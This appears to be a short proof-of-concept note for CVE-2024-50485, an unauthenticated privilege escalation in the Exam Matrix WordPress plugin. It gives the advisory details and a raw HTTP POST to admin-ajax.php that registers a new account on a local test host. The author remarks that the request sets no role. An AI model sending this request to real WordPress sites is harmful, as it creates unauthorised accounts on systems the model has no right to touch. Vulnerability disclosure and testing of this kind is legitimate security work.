# CVE-2024-50485
Exam Matrix &lt;= 1.5 - Unauthenticated Privilege Escalation

# Description:
The Exam Matrix plugin for WordPress is vulnerable to privilege escalation in all versions up to, and including, 1.5. This is due to the plugin not properly restricting functionality that makes it possible for unauthenticated users to register as a higher privileged role. This makes it possible for unauthenticated attackers to gain higher access privileges such as administrative.

```
Published: 2024-10-25 00:00:00
CVE: CVE-2024-50485
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CVSS Score: 9.8
Slugs: exam-matrix
```

This just lets you register as a user on here there is no option to change the role.

POC
---

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/plugins.php?plugin_status=all&paged=1&s
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 133
Origin: http://kubernetes.docker.internal
Connection: keep-alive

action=register_action&username=admin2&mail_id=test@test1.com&firname=John&lasname=Doe&address=123%20Main%20St&passwrd=securepassword
```

Response
--
```
goToImageUpload
```
